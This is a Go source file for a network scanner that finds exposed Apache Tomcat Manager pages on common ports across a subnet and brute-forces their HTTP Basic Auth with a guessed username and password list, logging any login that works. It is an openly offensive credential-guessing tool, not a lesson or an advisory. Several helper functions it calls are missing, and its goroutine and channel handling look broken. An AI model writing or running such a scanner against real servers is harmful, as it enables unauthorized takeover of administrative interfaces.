package main

import (
	"fmt"
	"log"
	"net"
	"net/http"
	"time"
)

type tcinstance struct {
	host             string
	port             int
	managerPath      string
	checked          bool
	managerAvailable bool
	finished         bool
}

// GET: /manager/html
// HTTP Basic Auth

func main() {
	guesses := buildGuesses()
	addrs := expandNetwork(&net.IPNet{IP: net.IPv4(127, 0, 0, 0), Mask: net.CIDRMask(24, 32)})
	ports := [6]int{8080, 8443, 80, 443, 8000, 8888}
	channel := make(chan tcinstance, 20)
	for gonum := 0; gonum < 10; gonum++ {
		go func() {
			tc := <-channel
			tc.check()
			for _, guess := range guesses {
				success, _ := request(&tc, guess.username, guess.password)
				if success {
					break
				}
			}
		}()
	}
	for _, element := range addrs {
		for _, port := range ports {
			tc := tcinstance{element.String(), port, "/manager/html", false, false, false}
			go func() { channel <- tc }()

		}
	}

}

func (tc *tcinstance) check() {
	client := &http.Client{
		Timeout: time.Second * 3,
	}
	log.Printf("[-] Checking %s\n", buildRequestURL(false, tc.host, tc.port, tc.managerPath))

	resp, err := client.Get(buildRequestURL(false, tc.host, tc.port, tc.managerPath))
	if err != nil {
		tc.checked = true
		tc.finished = true
		return
	}
	if resp.StatusCode == http.StatusNotFound {
		log.Printf("[-] Manager not found at %s:%d%s\n", tc.host, tc.port, tc.managerPath)
		tc.managerAvailable = false
	} else if resp.StatusCode == http.StatusForbidden {
		tc.managerAvailable = false
	} else if resp.StatusCode == http.StatusUnauthorized {
		tc.managerAvailable = true
		log.Printf("[*] Manager found at %s:%d%s\n", tc.host, tc.port, tc.managerPath)
	} else {
		fmt.Print(resp.StatusCode)
	}
	tc.checked = true
}

func request(tc *tcinstance, username string, password string) (success bool, err error) {
	if !tc.managerAvailable {
		return false, nil
	}
	client := &http.Client{
		Timeout: time.Second * 15,
	}
	url := buildRequestURL(false, tc.host, tc.port, tc.managerPath)
	log.Printf("Requesting %s\n", url)
	req, err := http.NewRequest("GET", url, nil)
	req.SetBasicAuth(username, password)
	resp, err := client.Do(req)
	if err != nil {
		return false, err
	}
	if resp.StatusCode == http.StatusOK {
		log.Printf("[+] Success! %s:%s on %s\n", username, password, url)
		return true, nil
	}
	return false, nil
}
